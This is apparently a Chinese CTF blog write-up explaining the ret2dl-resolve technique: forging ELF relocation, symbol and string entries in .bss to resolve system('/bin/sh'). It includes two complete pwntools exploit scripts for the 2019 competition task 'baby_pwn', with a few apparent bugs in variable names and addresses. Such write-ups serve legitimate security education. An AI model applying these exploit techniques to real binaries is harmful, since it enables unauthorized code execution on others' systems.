---
layout: post
title:  "2019.4.23 ret2dl-resolve"
tags: [ROP, pwn, ret2dl-resolve, writeup]
date: 2019-04-23
comments: false
---

# ROP - ret2dlresolve

前两天打国赛遇到一个ret2resolve的题，正好前一天研究过，又是个原题。

比赛时脚本是用roputil.py构造的。现在来记录一下原理和手动构造的方法。    

简单说一下lazy bind机制下动态链接的过程。

第一次调用某库函数时，其对应GOT表中是没有其真实地址的，因此不会直接根据GOT表内容跳到对应内存地址执行函数。

而是进行一个动态链接，这个过程正常来说会将要调用库函数的真实地址写到其对应GOT表中。

动态链接之后程序便会将控制权交给对应函数。    

简单来说，整个动态链接实质上就是执行`_dl_runtime_resolve(link_map_obj, reloc_index)`这个函数的过程。

以32位程序为例，这个过程涉及到几个关键结构体和table：

1. ELF JMPREL Relocation Table  

   这个table中包含着`Elf32_Rel`结构体  

   其结构为:

```c
   typedef struct {
   Elf32_Addr r_offset;    
   Elf32_Word r_info;
   } Elf32_Rel;
```

   ![5cbed3a1909c4](https://i.loli.net/2019/04/23/5cbed3a1909c4.png)

   ![5cbed5fa8719a](https://i.loli.net/2019/04/23/5cbed5fa8719a.png)  

   实际上r_offset是对应函数got表的地址，也就是最后要写值的地址。r_info是用来寻址的，其低8位一般为0x07，`r_info >> 8`为对应函数的Elf32_Sym结构体在ELF Symbol Table中的下标。read函数的`r_info`为0x107,观察可以得知，下图ELF Symbol Table中read函数下标恰好为1。  

   同时由上图可知，Elf32_Rel结构体是从0x804833c开始，8字节对齐的，这一点在布局时很关键。  

2. ELF Symbol Table

   这个table中包含`Elf32_Sym`结构体

   其结构为:

   ```c
   typedef struct
   {
       Elf32_Word st_name;     // Symbol name(string tbl index)
       Elf32_Addr st_value;    // Symbol value
       Elf32_Word st_size;     // Symbol size
       unsigned char st_info;  // Symbol type and binding
       unsigned char st_other; // Symbol visibility under glibc>=2.2
       Elf32_Section st_shndx; // Section index
   } Elf32_Sym;
   ```

   ![5cbed450b1e53](https://i.loli.net/2019/04/23/5cbed450b1e53.png)

   ![5cbed6797c164](https://i.loli.net/2019/04/23/5cbed6797c164.png)  

   这里只要关心两个属性，st_name中存的是对应函数名在elf_string_table中的偏移。st_info一般为0x12。  

   同时由上图可知，Elf32_Sym结构体是从0x80481dc开始，16字节对齐的，这一点在布局时很关键。  

3. ELF String Table  

   这个table包含的是对应函数的名字。  

   ![5cbed5b6419fb](https://i.loli.net/2019/04/23/5cbed5b6419fb.png)

   ![5cbed6e82afbb](https://i.loli.net/2019/04/23/5cbed6e82afbb.png)

具体过程，`dl_runtime_resolve`函数需要两个参数，分别为link_map，reloc_arg。

link_map参数在当程序执行到`plt[0]`时会被push入栈，不需要我们操作。

`dl_runtime_resolve`会根据传入的reloc_arg：

1. 在`ELF JMPREL Relocation Table`中搜索对应函数的`Elf32_Rel`结构体。

2. 根据对应`Elf32_Rel`结构体的`r_info`属性，去`ELF Symbol Table`中寻找对应函数的`Elf32_Sym`结构体。

3. 根据对应`Elf32_Sym`结构体的`st_name`属性，去`ELF String Table`中找到对应函数的名字，并在libc中搜索这个函数，将其真实地址写在对应`Elf32_Rel`结构体`r_offset`属性指向的地址(正常为函数的GOT表)。

上面寻找的过程，是通过`基地址+偏移`来进行的，也就是通过`table地址+offset`。值得注意的是，`dl_runtime_resolve`并没有对reloc_arg，r_info，st_name限制上界。  

也就是说，我们可以传入一个很大的reloc_arg，让`ELF JMPREL Relocation Table + reloc_arg`寻找到的`Elf32_Rel`结构体落在我们可控的区域(如bss)。从而控制其找到我们伪造的`Elf32_Rel`结构体。

控制了`Elf32_Rel`结构体，我们可以伪造它的r_info属性为一个很大的值，使得`ELF Symbol Table + r_info >> 8`同样落在可控区域。从而控制其找到我们伪造的`Elf32_Sym`结构体。

控制了`Elf32_Sym`结构体，我们可以伪造它的`st_name`属性为一个很大的值，使得`ELF String Table + st_name`也落在可控区域，从而最终控制了要链接的函数。

一个例子如下：

这是我们在bss段上伪造好的一系列结构体。

![5cbee0ff6fafc](https://i.loli.net/2019/04/23/5cbee0ff6fafc.png)

黄色为最后getshell的参数，`/bin/sh`  

红色为伪造的`Elf32_Rel`结构体(可以看出来他以0x0804833C为基址对齐了8字节。)，其`r_offset`属性在这里不是got表，而是bss上的一个地址(因为动态链接之后会直接将控制权交给对应函数，所以`r_offset`属性并不重要)。其r_info属性(0x1e907)会指引`dl_runtime_resolve`函数找到伪造的`Elf_Sym`结构体，即蓝色区域。  

蓝色为伪造的`Elf_Sym`结构体(可以看出来他以0x080481DC为基址对齐了16字节。)，其`st_name`属性(0x1e04)会指引`dl_runtime_resolve`函数找到我们的恶意函数名，即绿色区域，并将恶意函数实际地址写在`r_offset`位置，然后将控制权交给恶意函数。  

绿色为恶意函数名，这里为`system`函数。(不需对齐)  

各个偏移的计算方法。

reloc_arg : 要控制其找到红色区域，只要使得reloc_arg为`红色区域地址 - ELF JMPREL Relocation Table基址`，即为0x804a054 - 0x0804833C = 0x1d18

r_info : 要控制其找到蓝色区域，只要使得r_info低8位为`0x07`，高位为`(蓝色区域地址 - ELF Symbol Table基址)*0x10`，即r_info = (0x804a06c - 0x080481DC)*0x10 + 0x07 = `0x1e907`

st_name : 要控制其找到绿色区域，只要使得st_name为`绿色区域地址 - ELF String Table基址`，即st_name = 0x0804a080 - 0x0804827C =`0x1e04`  

构造好了，怎么触发并且getshell呢？

要想手动触发恶意`dl_runtime_resolve`，只需将reloc_arg压入栈中然后将程序执行流导向`plt[0]`即可。

此例为`payload = padding + p32(plt0addr) + p32(reloc_arg) + 'AAAA' + p32(0x804a040)`，其中`padding`为溢出到返回地址之前的填充，`'AAAA'`为执行完恶意函数后的返回地址，`0x804a040`为传递给恶意函数的参数，即`/bin/sh`地址。

---

## 例：2019第12届全国大学生信息安全竞赛 baby_pwn

checksec:

![5cbee6bda0317](https://i.loli.net/2019/04/23/5cbee6bda0317.png)

![5cbee70260cd4](https://i.loli.net/2019/04/23/5cbee70260cd4.png)

![5cbee70b576f8](https://i.loli.net/2019/04/23/5cbee70b576f8.png)

明显的栈溢出，但是整个程序没有可以泄露信息的地方。

可以使用ret2dl-resolve攻击。

第一次溢出利用read往bss写入构造的结构体，控制返回到vuln()进行第二次输入。

第二次溢出控制执行流到plt[0\]，并将所需参数压栈。

getshell。

exp:

```python
from pwn import *

io = process('./pwn')
elf = ELF('./pwn')
#io = remote('da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com', 33865)

context.log_level = 'debug'
context.terminal = ['terminator' , '-x' , 'sh' , '-c']


'''
before:
pwndbg> x/64wx 0x804a040
0x804a040:    0xf7f44cc0    0x00000000    0x00000000    0x00000000

0x804a050:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a060:    0xf7f445a0    0xf7f44d60    0x00000000    0x00000000

0x804a070:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a080:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a090:    0x00000000    0x00000000    0x00000000    0x00000000
after:
pwndbg> x/32wx 0x0804a040
0x804a040:    0x6e69622f    0x0068732f    0x41414141    0x41414141

0x804a050:    0x41414141    0x0804a048    0x0001e907    0x41414141
0x804a060:    0x41414141    0x41414141    0x41414141    0x00001e04

0x804a070:    0x00000000    0x00000000    0x00000012    0x41414141
0x804a080:    0x74737973    0x00006d65    0x00000000    0x00000000
'''
offset = 44
bssaddr = elf.bss()

readplt = 0x08048390
vulFunc = 0x0804852
jmprel = 0x0804833C
symtable = 0x080481DC
strtable = 0x0804827C
plt0 = 0x08048380


fakerelt = bssaddr + 4*5 - jmprel  #0x1d18
fakesymtable = bssaddr + 4*11 - symtable
fakestr = 0x804a080-strtable

pay1 = 'a'*44
pay1+= p32(readplt) + p32(vulFunc) + p32(0) + p32(bssaddr) + p32(100)
p.send(pay1)

pay2 = '/bin/sh\x00'+'A'*12
pay2 += p32(bssaddr+8) + p32(fakesymtable*0x10+7) + 'A'*16 + p32(fakestr) + p32(0) + p32(0) + p32(0x12) + 'AAAA'
pay2 += 'system\x00'

p.send(pay2)

pay3 = 'A'*44
pay3+= p32(plt0)
pay3 += p32(fakerelt)
pay3 += 'aaaa'
pay3 += p32(elf.bss())

p.send(pay3)

p.interactive()
```

![5cbee9f27437d](https://i.loli.net/2019/04/23/5cbee9f27437d.png)

当然，使用[roputil.py](https://github.com/eternalsakura/ctf_pwn/blob/master/roputils.py)这个库来自动化构造肯定是首选的，此处参考[sakura](http://eternalsakura13.com/2018/04/01/babystack/)师傅的exp:

```python
#coding:utf-8
import sys
import roputils
from pwn import *

offset = 44
readplt = 0x08048390
bss = 0x0804a020
vulFunc = 0x0804852D

rop = roputils.ROP('./pwn')
addr_bss = rop.section('.bss')

# step1 : write sh & resolve struct to bss
buf1 = 'A' * offset #44
buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)
p.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss+20, 'system')
buf2 += rop.fill(100, buf2)

print buf2
print hex(addr_bss)
p.send(buf2)

#debug()
#step2 : use dl_resolve_call get system & system('/bin/sh')
buf3 = 'A'*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)
p.send(buf3)
#print hex(u32(buf3[48:52])),len(buf3)


debug()
p.interactive()
```
